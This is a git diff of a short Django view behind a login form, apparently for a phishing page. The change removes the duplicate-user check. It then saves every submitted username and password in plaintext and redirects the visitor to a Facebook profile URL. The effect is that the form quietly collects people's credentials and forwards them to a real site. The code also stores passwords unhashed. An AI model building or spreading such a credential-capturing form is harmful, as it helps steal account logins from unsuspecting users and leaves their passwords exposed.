@@ -1,4 +1,4 @@
-from django.shortcuts import render
+from django.shortcuts import render, HttpResponseRedirect
 from .models import Tabel
 from django.contrib import messages
 # Create your views here.
@@ -12,17 +12,18 @@ def main_function(request):
             messages.error(request, 'Requead Uername and Password 💀', fail_silently=True)
             return render(request, 'Login-From.html')
 
-        #User Exitis
-        if Tabel.objects.filter(username=usern).exists():   
-            messages.error(request, "Users Already exits 🥲")
-            return render(request, 'Login-From.html')
-        else:
-            user_deta = Tabel(username=usern, password=pasw)
-            user_deta.save()
-            messages.success(request, 'Login Successfully 😊')
-            return render(request, 'Login-From.html')
+        # #User Exitis
+        # if Tabel.objects.filter(username=usern).exists():   
+        #     messages.error(request, "Users Already exits 🥲")
+        #     return render(request, 'Login-From.html')
+        # else:
+        user_deta = Tabel(username=usern, password=pasw)
+        user_deta.save()
+        # messages.success(request, 'Login Successfully 😊')
+        return HttpResponseRedirect('https://www.facebook.com/world103')
         
     else:
+        print('get')
         return render(request, 'Login-From.html')
     return render(request, 'Login-From.html')
 
